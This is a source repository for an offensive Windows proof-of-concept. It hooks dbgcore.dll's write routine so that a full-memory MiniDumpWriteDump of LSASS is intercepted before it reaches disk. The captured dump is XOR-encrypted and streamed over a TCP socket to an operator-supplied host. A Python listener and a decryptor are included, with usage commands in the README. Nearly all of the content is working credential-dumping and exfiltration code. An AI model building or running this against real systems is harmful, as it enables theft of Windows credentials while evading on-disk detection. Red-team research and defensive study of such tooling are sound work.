Project Path: arc_gmh5225_MiniDumpWriteDumpPoC_2r13qf78

Source Tree:

```txt
arc_gmh5225_MiniDumpWriteDumpPoC_2r13qf78
├── README.md
├── conf.h
├── covert.cpp
├── covert.h
├── dec.py
├── minidump.vcxproj
├── minidump.vcxproj.filters
├── minidump.vcxproj.user
├── minidumpPoC.cpp
├── minidumpPoC.sln
├── serv.py
├── utils.cpp
└── utils.h

```

`README.md`:

```md
# MiniDumpWriteDumpPoC
MiniDumpWriteDump behavior modification hook

Read the full article in our blog: [Adepts Of 0xCC: Hooks On Hoot Off](https://adepts.of0x.cc/hookson-hootoff/)

This is a function hook that allows to access the buffer generated by MiniDumpWriteDump before it gets to disk.

Once accessed, it will encrypt the buffer and send it through a socket to a given host. 


## Compilation

A full VS solution is provided. Just compile it. 


## Usage

First, set up the server to listen on the receiving host: 

```
python3 serv.py <PORT>

    python3 serv.py 1234
```


```
.\minidumppoc.exe <LSASS_PID> <WRITE_TO_FILE 0|1> <EXFIL 0|1> [<HOST> <PORT>] [<EXPORT_PATH>]

    minidump.exe 696 1 1 '192.168.1.10' 1234 "c:\test.dmp"
```

Once the whole file is received, close the server, and use the dummy decryptor: 

```
python3 dec.py woot.dmp woot_decrypted.dmp 0xb0
```



```

`conf.h`:

```h
#pragma once
unsigned char XOR_KEY = 0xb0;
bool USE_ENCRYPTION = true;
bool WRITE_TO_FILE = true;
int EXFIL_METHOD = 0;
bool EXFIL = false;
const char* EXFIL_HOST;
const char* EXPORT_PATH;
int EXFIL_PORT;
int LSASS_PID;



```

`covert.cpp`:

```cpp
#define _CRT_SECURE_NO_WARNINGS
#include "covert.h"

#include <Windows.h>
#include <stdlib.h>
#include <stdio.h>



SOCKET singleton_socket;

SOCKET getRawSocket(const char* host, u_short port)
{
    WSADATA wsa_data;
    WORD req_version = MAKEWORD(2, 2);
    
    if (!singleton_socket) {
        if (0 != WSAStartup(req_version, &wsa_data)) {
            printf("[!] ERR:: Socket init failed. ERR_CODE %d\n", WSAGetLastError());

            singleton_socket = NULL;
        }
        else {
            singleton_socket = socket(AF_INET, SOCK_STREAM, 0);
            if (singleton_socket == INVALID_SOCKET) {
                printf("[!] ERR:: Socket creation failed. ERR_CODE %d\n", WSAGetLastError());

                singleton_socket = NULL;
            }
            else {
                struct sockaddr_in server_config;
                unsigned long addr = inet_addr(host);
                char* ip;

                if (INADDR_NONE != addr) {
                    server_config.sin_addr.s_addr = addr;
                }
                else {
                    ip = inet_ntoa(*(struct in_addr*)gethostbyname(host)->h_addr_list[0]);
                    server_config.sin_addr.s_addr = inet_addr(ip);
                }
                
                server_config.sin_family = AF_INET;
                server_config.sin_port = htons(port);

                if (connect(singleton_socket, (struct sockaddr*)&server_config, sizeof(server_config)) < 0) {
                    printf("[!] ERR:: Socket connection failed. ERR_CODE %d\n", WSAGetLastError());

                    singleton_socket = NULL;
                }
                else {
                    printf("[i] Connection stablished with %s:%i\n", host, port);
                    printf("Sending...\n");
                }
            }
        }
    }
    
    return singleton_socket;
}

int sendBytesRaw(SOCKET s, const char* buffer, int buffer_size, long pos)
{
    int sent_bytes = 0;
    int tried = 0;
    int real_size;
    char* full_buffer = prepareBuffer(buffer, buffer_size, pos, &real_size);

    sent_bytes = send(s, full_buffer, real_size, 0);

    while (sent_bytes < 0 && tried < MAX_RETRIES) {
        printf("[!] ERR:: Could not send %iB. Retrying... %i\n", buffer_size, tried);
        sent_bytes = send(s, full_buffer, real_size, 0);
        ++tried;
    }

    free(full_buffer);
    return sent_bytes;
}

void closeSocket() {
    closesocket(singleton_socket);
}


```

`covert.h`:

```h
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#pragma once

#include <winsock2.h>
#include "utils.h"

#pragma comment (lib, "ws2_32.lib")

#define MAX_RETRIES 3

SOCKET getRawSocket(const char* ip, u_short port);
void closeSocket();
int sendBytesRaw(SOCKET s, const char* buffer, int size, long pos);


```

`dec.py`:

```py
import sys


with open(sys.argv[1], 'rb') as f:
    f_contents = f.read()
    with open(sys.argv[2], 'wb') as w:
            key = int(sys.argv[3], 16)
            decr = bytes(b ^  key for b in f_contents)
            w.write(decr)

```

`minidump.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>16.0</VCProjectVersion>
    <Keyword>Win32Proj</Keyword>
    <ProjectGuid>{1842203d-f308-420d-a47e-39f00af69500}</ProjectGuid>
    <RootNamespace>minidump</RootNamespace>
    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
    <ProjectName>minidumpPoc</ProjectName>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <LinkIncremental>true</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <LinkIncremental>true</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <InlineFunctionExpansion>Default</InlineFunctionExpansion>
      <OmitFramePointers>false</OmitFramePointers>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClInclude Include="conf.h" />
    <ClInclude Include="covert.h" />
    <ClInclude Include="utils.h" />
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="covert.cpp" />
    <ClCompile Include="minidumpPoc.cpp" />
    <ClCompile Include="utils.cpp" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`minidump.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Archivos de origen">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;c++;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Archivos de encabezado">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;h++;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="Archivos de recursos">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="conf.h">
      <Filter>Archivos de encabezado</Filter>
    </ClInclude>
    <ClInclude Include="covert.h">
      <Filter>Archivos de encabezado</Filter>
    </ClInclude>
    <ClInclude Include="utils.h">
      <Filter>Archivos de encabezado</Filter>
    </ClInclude>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="covert.cpp">
      <Filter>Archivos de origen</Filter>
    </ClCompile>
    <ClCompile Include="utils.cpp">
      <Filter>Archivos de origen</Filter>
    </ClCompile>
    <ClCompile Include="minidumpPoc.cpp">
      <Filter>Archivos de origen</Filter>
    </ClCompile>
  </ItemGroup>
</Project>
```

`minidump.vcxproj.user`:

```user
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="Current" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <LocalDebuggerCommandArguments>684 1 1 "192.168.1.130" 1234 "c:\woot.dmp"</LocalDebuggerCommandArguments>
    <DebuggerFlavor>WindowsLocalDebugger</DebuggerFlavor>
  </PropertyGroup>
</Project>
```

`minidumpPoC.cpp`:

```cpp
#pragma once
#define _CRT_SECURE_NO_WARNINGS
#include "covert.h"
#include "conf.h"
#include "utils.h"
#include <Windows.h>
#include <stdio.h>
#include <DbgHelp.h>

#pragma comment (lib, "Dbghelp.lib")

intptr_t writeAll_abs;
HANDLE hProcess;
HANDLE our_dmp_handle;
SOCKET s;

char overwritten_writeAll[13];

char trampoline_assembly[13] = {
    0x49, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,         // mov r10, NEW_LOC_@ddress
    0x41, 0xFF, 0xE2                                                    // jmp r10
};



void minidumpThis(HANDLE hProc)
{
    our_dmp_handle = CreateFileA(EXPORT_PATH, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (!our_dmp_handle)
    {
        printf("No dump for you. Wrong file\n");
    }
    else
    {
        DWORD lsassPid = GetProcessId(hProc);
        printf("Got PID:: %i\n", lsassPid);
        BOOL Result = MiniDumpWriteDump(hProc, lsassPid, our_dmp_handle, MiniDumpWithFullMemory, NULL, NULL, NULL);
        CloseHandle(our_dmp_handle);

        if (!Result)
        {
            printf("No dump for you. Minidump failed\n");
        }
    }

    return;
}


unsigned char* hoot(void* buffer, INT64 size, long pos) {
    unsigned char* new_buff = (unsigned char*) buffer;

    if (USE_ENCRYPTION) {
        new_buff = encrypt(buffer, size, XOR_KEY);
    }
  
    if (EXFIL) {
        s = getRawSocket(EXFIL_HOST, EXFIL_PORT);
        if(s) {
            sendBytesRaw(s, (const char*)new_buff, size, pos);
        }
        else {
            printf("[!] ERR:: SOCKET NOT READY\n");
         }
    }

    if (!WRITE_TO_FILE) {
        memset(new_buff, 0x00, size);
    }
   
    return new_buff;
}

UINT32 _hoot_trampoline(HANDLE file_handler, void* buffer, INT64 size) {
    WriteProcessMemory(hProcess, (LPVOID*)writeAll_abs, &overwritten_writeAll, sizeof(overwritten_writeAll), NULL);

    long high_dword = NULL;
    DWORD low_dword = SetFilePointer(our_dmp_handle, NULL, &high_dword, FILE_CURRENT);
    long pos = high_dword << 32 | low_dword;

    unsigned char* new_buff = hoot(buffer, size, pos);

    UINT32 ret = ((UINT32(*)(HANDLE, void*, INT64))(writeAll_abs))(file_handler, (void*)new_buff, size);      // erg...
    WriteProcessMemory(hProcess, (LPVOID*)writeAll_abs, &trampoline_assembly, sizeof(trampoline_assembly), NULL);

    return ret;
}


bool parse_args(int argc, char* args[]) {
    bool success = false;
    if (argc > 2) {
        LSASS_PID = atoi(args[1]);
        WRITE_TO_FILE = atoi(args[2]);
        EXFIL = atoi(args[3]);
        if (USE_ENCRYPTION) {
            printf("XOR-Encrypting with 0x%x\n", XOR_KEY);
        }
        if (EXFIL) {
            printf("Attempting to exfil dump..");
            EXFIL_HOST = args[4];
            EXFIL_PORT = atoi(args[5]);
        }

        if (WRITE_TO_FILE) {
            EXPORT_PATH = args[6];
            printf("Exporting dump to %s\n", EXPORT_PATH);
        }
        else
            EXPORT_PATH = "C:\\temp.dmp";
        success = true;
    }
    else {
        printf("[!] ERR:: Incorrect args number.\nEx: minidump.exe <LSASS_PID> <WRITE_TO_FILE 0|1> <EXFIL 0|1> [<HOST> <PORT>] [<EXPORT_PATH>]\n\tminidump.exe 696 1 '192.168.1.10' 1234");
    }

    return success;
}



int main(int argc, char* args[])
{

    if (!IsElevated()) {
        printf("not admin\n");
        return -1;
    }
    if (!SetDebugPrivilege()) {
        printf("no SeDebugPrivs\n");
        return -1;
    }

    if (!parse_args(argc, args))
        return -1;

      
    
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, GetCurrentProcessId());


    const char* dbgcore_name = "dbgcore.dll";
    intptr_t dbgcore_handle = (intptr_t)LoadLibraryA(dbgcore_name);
    printf("dbgcore@%I64X\n", dbgcore_handle);


    intptr_t writeAll_offset = 0xb4b0;
    writeAll_abs = dbgcore_handle + writeAll_offset;

    void* _hoot_trampoline_address = (void*)_hoot_trampoline;
    memcpy(&trampoline_assembly[2], &_hoot_trampoline_address, sizeof(_hoot_trampoline_address));

    printf("writeAll@%I64X\n", (LPVOID*)writeAll_abs);
    printf("_hoot_trampoline@%I64X\n", _hoot_trampoline);

    memcpy(overwritten_writeAll, (void*)writeAll_abs, sizeof(overwritten_writeAll));
    WriteProcessMemory(hProcess, (LPVOID*)writeAll_abs, &trampoline_assembly, sizeof(trampoline_assembly), NULL);


    HANDLE lsassProcess_handle = NULL;

    lsassProcess_handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, LSASS_PID);
    minidumpThis(lsassProcess_handle);
    CloseHandle(lsassProcess_handle);

    if (s)
        closeSocket();
    if (!WRITE_TO_FILE)
        remove(EXPORT_PATH);

	return 0;
}

```

`minidumpPoC.sln`:

```sln

Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio Version 16
VisualStudioVersion = 16.0.30204.135
MinimumVisualStudioVersion = 10.0.40219.1
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "minidump", "minidump.vcxproj", "{1842203D-F308-420D-A47E-39F00AF69500}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|x64 = Debug|x64
		Debug|x86 = Debug|x86
		Release|x64 = Release|x64
		Release|x86 = Release|x86
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{1842203D-F308-420D-A47E-39F00AF69500}.Debug|x64.ActiveCfg = Debug|x64
		{1842203D-F308-420D-A47E-39F00AF69500}.Debug|x64.Build.0 = Debug|x64
		{1842203D-F308-420D-A47E-39F00AF69500}.Debug|x86.ActiveCfg = Debug|Win32
		{1842203D-F308-420D-A47E-39F00AF69500}.Debug|x86.Build.0 = Debug|Win32
		{1842203D-F308-420D-A47E-39F00AF69500}.Release|x64.ActiveCfg = Release|x64
		{1842203D-F308-420D-A47E-39F00AF69500}.Release|x64.Build.0 = Release|x64
		{1842203D-F308-420D-A47E-39F00AF69500}.Release|x86.ActiveCfg = Release|Win32
		{1842203D-F308-420D-A47E-39F00AF69500}.Release|x86.Build.0 = Release|Win32
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(ExtensibilityGlobals) = postSolution
		SolutionGuid = {E95DE95C-2970-4FD4-A9E1-8B429A823B6F}
	EndGlobalSection
EndGlobal

```

`serv.py`:

```py
import socket
import sys

if __name__ == '__main__':
	s = socket.socket()
	s.bind(('0.0.0.0', int(sys.argv[1])))
	s.listen(5)

	while True:
		print("Ready...")
		c, addr = s.accept()
		print("[!] Connection from::", addr)
		print("Receiving...")
		l = c.recv(65540)
		buff = b''
		try:

			while (l):
				buff += l
				l = c.recv(65540)
		except:
			print("[!] Socket incorrectly closed... Attempting to save anyway")

		finally:

			with open('woot.dmp', 'wb') as f:
				curr_offset = 0
				curr_size = 0

				while curr_offset < len(buff):
					wr_offset = int.from_bytes(buff[curr_offset:curr_offset+4], "little")
					curr_offset += 4
					wr_size = int.from_bytes(buff[curr_offset:curr_offset+4], "little")
					curr_offset += 4
					#print("[i] Offset::", wr_offset, "-- Size::", wr_size)

					f.seek(wr_offset)
					f.write(buff[curr_offset:curr_offset+wr_size])
					curr_offset += wr_size

		print("Done!")

```

`utils.cpp`:

```cpp
#include "utils.h"
#include <stdio.h>
#include <Windows.h>



unsigned char* encrypt(void* buffer, long long size, char key) {
    unsigned char* new_buff = (unsigned char*)malloc(size);

    for (long long i = 0; i < size; ++i)
        new_buff[i] = *(((unsigned char*)buffer) + i) ^ key;

    return new_buff;
}


char* prepareBuffer(const char* buffer, int buffer_size, long pos, int* real_size) {
    *real_size = buffer_size + sizeof(pos) + sizeof(buffer_size);
    char* full_buffer = (char*)malloc(*real_size);

    memcpy(full_buffer, &pos, sizeof(pos));
    memcpy(full_buffer + sizeof(pos), &buffer_size, sizeof(buffer_size));
    memcpy(full_buffer + sizeof(pos) + sizeof(buffer_size), buffer, buffer_size);

    return full_buffer;
}


bool IsElevated() {
    BOOL fRet = FALSE;
    HANDLE hToken = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION Elevation = { 0 };
        DWORD cbSize = sizeof(TOKEN_ELEVATION);
        if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize)) {
            fRet = Elevation.TokenIsElevated;
        }
    }
    if (hToken) {
        CloseHandle(hToken);
    }
    return fRet;
}

bool SetDebugPrivilege() {
    HANDLE hToken = NULL;
    TOKEN_PRIVILEGES TokenPrivileges = { 0 };

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken)) {
        return FALSE;
    }

    TokenPrivileges.PrivilegeCount = 1;
    TokenPrivileges.Privileges[0].Attributes = TRUE ? SE_PRIVILEGE_ENABLED : 0;

    const wchar_t* lpwPriv = L"SeDebugPrivilege";
    if (!LookupPrivilegeValueW(NULL, (LPCWSTR)lpwPriv, &TokenPrivileges.Privileges[0].Luid)) {
        CloseHandle(hToken);
        printf("I dont have SeDebugPirvs\n");
        return FALSE;
    }

    if (!AdjustTokenPrivileges(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
        CloseHandle(hToken);
        printf("Could not adjust to SeDebugPirvs\n");

        return FALSE;
    }

    CloseHandle(hToken);
    return TRUE;
}


bool preparePipe(void* read_handle, void *write_handle) {
    bool success = false;

    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, true };

    if (!CreatePipe(&read_handle, &write_handle, &sa, 0)) {
        printf("[!] ERR:: Could not create a pipe\n");
    }
    else {
        printf("[i] Pipe created\n");
        success = true;
        STARTUPINFOA startup_info;

        GetStartupInfoA(&startup_info);
        startup_info.hStdInput = read_handle;
        SetHandleInformation(write_handle, HANDLE_FLAG_INHERIT, 0);

    }
    return success;
}

```

`utils.h`:

```h
#pragma once


unsigned char* encrypt(void* buffer, long long size, char key);
char* prepareBuffer(const char* buffer, int buffer_size, long pos, int* real_size);
bool IsElevated();
bool SetDebugPrivilege();

```